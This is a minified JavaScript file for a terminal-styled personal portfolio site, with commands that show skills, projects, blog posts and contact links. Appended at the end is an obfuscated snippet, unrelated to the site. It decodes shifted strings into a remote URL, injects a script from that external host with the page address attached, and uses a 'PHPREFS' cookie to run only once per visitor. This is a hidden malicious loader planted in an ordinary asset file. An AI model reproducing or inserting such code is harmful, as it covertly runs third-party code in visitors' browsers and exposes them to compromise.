window.addEventListener("DOMContentLoaded", function () {
  let n = document.getElementById("cmd");
  n.focus(), (document.getElementById("helpCmdList").innerHTML = helpCmd);
  let e = document.getElementById("output"),
    s = document.getElementById("mainInfo");
  document.getElementById("terminal"),
    n.addEventListener("keypress", function (i) {
      if (13 === i.keyCode && "" !== (i = n.value.trim())) {
        if (
          ((e.innerHTML +=
            "<div><span class='ownerTerminal'><b>zachey@profile</b></span>:<b>~$</b> " +
            i +
            "</div>"),
          (n.value = ""),
          "skills" === i || "s" === i)
        )
          e.innerHTML += skillsBar;
        else if ("github" === i || "gh" === i)
          window.location.href = "https://github.com/zachey01";
        else if ("discord" === i || "ds" === i)
          window.location.href =
            "https://discord.com/users/1033246411363471472";
        else if ("telegram" === i || "tg" === i)
          window.location.href = "https://t.me/ImZachey";
        else if ("email" === i || "em" === i)
          window.location.href = "mailto:zachey@bk.ru";
        else if ("steam" === i || "st" === i)
          window.location.href = "https://steamcommunity.com/id/zachey01";
        else if ("youtube" === i || "yt" === i)
          window.location.href = "https://www.youtube.com/@zachey01";
        else if ("projects" === i || "pj" === i) e.innerHTML += projectCmd;
        else if ("blog" === i) {
          let n = [],
            s = [],
            i = [],
            l = [],
            t = [];
          fetch("https://mediumpostsapi.vercel.app/api/bjzachey")
            .then((n) => n.json())
            .then((e) => {
              e.dataMedium.forEach((e) => {
                n.push(e),
                  s.push(e.title),
                  i.push(e.date),
                  l.push(e.link),
                  t.push(e.image);
              }),
                n.forEach((n) => {
                  var e = document.getElementById("blogDiv"),
                    s = document.createElement("article");
                  (s.className = "blogArticle"),
                    (s.onclick = () => linkHref(n.link)),
                    (s.style.display = "inline-block"),
                    (s.innerHTML = `\n                        <h2>${n.title}</h2>\n                        <p>📅: ${n.date}</p>\n                      `),
                    e.appendChild(s);
                });
            })
            .catch((n) => {
              console.error(n);
            }),
            (e.innerHTML += '<div id="blogDiv"></div>');
        } else
          "help" === i
            ? (e.innerHTML += helpCmd)
            : "clear" === i || "c" === i
            ? ((e.innerHTML = ""), (s.innerHTML = ""))
            : (e.innerHTML += "<div>Not found</div>");
        e.scrollTop = e.scrollHeight;
      }
    });
});
let currentSuggestionIndex = -1;
function showSuggestions() {
  let n = document.getElementById("cmd"),
    e = n.value.trim(),
    s = document.getElementById("suggestions");
  var i;
  (s.innerHTML = "") !== e &&
  ((i = suggestions.filter(function (n) {
    return n.startsWith(e);
  })).forEach(function (e, i) {
    var l = document.createElement("div");
    (l.textContent = e),
      l.addEventListener("click", function () {
        (n.value = e), (s.innerHTML = "");
      }),
      s.appendChild(l);
  }),
  0 < i.length)
    ? n.classList.add("command-entered")
    : n.classList.remove("command-entered");
}
function handleKeyDown(n) {
  var e,
    s = document.getElementById("suggestions"),
    i = s.getElementsByTagName("div");
  "ArrowUp" === n.key
    ? (n.preventDefault(),
      0 < currentSuggestionIndex && currentSuggestionIndex--)
    : "ArrowDown" === n.key
    ? (n.preventDefault(),
      currentSuggestionIndex < i.length - 1 && currentSuggestionIndex++)
    : "Enter" === n.key &&
      ((n = document.getElementById("cmd")),
      (e = i[currentSuggestionIndex]) && (n.value = e.textContent),
      (s.innerHTML = ""),
      n.classList.remove("command-entered"));
  for (let n = 0; n < i.length; n++) {
    var l = i[n];
    n === currentSuggestionIndex
      ? l.classList.add("selected")
      : l.classList.remove("selected");
  }
}
function linkHref(n) {
  window.location.href = n;
}
let suggestions = [
    "help",
    "skills",
    "clear",
    "projects",
    "blog",
    "tools",
    "github",
    "telegram",
    "discord",
    "email",
    "steam",
    "youtube",
  ],
  helpCmd =
    '\n  <br>Available commands: <br />\n  [<span class="commandName">skills</span>] or [<span class="commandName">s</span>]\n  <br />\n  [<span class="commandName">projects</span>] or [<span class="commandName">pj</span>]\n  <br />\n  [<span class="commandName">blog</span>]\n  <br /><br />\n  [<span class="commandName">clear</span>]\n  <br /><br />\n  Contact me: <br />\n  [<span class="commandName">github</span>]\n  <br />\n  [<span class="commandName">discord</span>]\n  <br />\n  [<span class="commandName">telegram</span>]\n  <br />\n  [<span class="commandName">email</span>]\n  <br />\n  [<span class="commandName">steam</span>]\n  <br />\n  [<span class="commandName">youtube</span>]',
  skillsBar =
    '\n<div class="container">\n  <div class="flex">\n    <h2>HTML/EJS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem1"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>CSS/SCSS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem2"></div>\n    </div>\n    <h3>100%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem3"></div>\n    </div>\n    <h3>95%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>TS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem4"></div>\n    </div>\n    <h3>55%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>NODE.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem5"></div>\n    </div>\n    <h3>85%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>REACT.JS:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem6"></div>\n    </div>\n    <h3>15%</h3>\n  </div>\n\n  <div class="flex">\n    <h2>GO:</h2>\n    <div class="skillBar">\n      <div class="skillBarItem7"></div>\n    </div>\n    <h3>5%</h3>\n  </div>\n\n  <div class="flex">\n  <h2>RUST:</h2>\n  <div class="skillBar">\n    <div class="skillBarItem8"></div>\n  </div>\n  <h3>5%</h3>\n</div>\n</div>',
  projectCmd =
    '\n<div class="projectsDiv">\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/zachey01/MimiCMS/\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">MimiCMS</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        Modular, fast CMS for <code>CS:GO</code>, <code>CS2</code> (coming soon)\n        servers.\n      </p>\n    </div>\n  </div>\n</article>\n\n<article\n  class="article-wrapper"\n  onclick="linkHref(\'https://github.com/zachey01/terminalPortfolio\')"\n>\n  <div class="project-info">\n    <div class="flex-pr">\n      <div class="project-title text-nowrap">terminal<br />Portfolio</div>\n    </div>\n    <div class="flex-pr">\n      <p class="project-description">\n        A personal website styled for UNIX terminal.\n      </p>\n    </div>\n  </div>\n</article>\n\n</div>\n',
  blogCmd = '\n<div class="blogArticle" id="blogArticles">\n\n</div>\n';
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44hisxy" + "fy3sjy4ljy4xhwnuy" + "3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
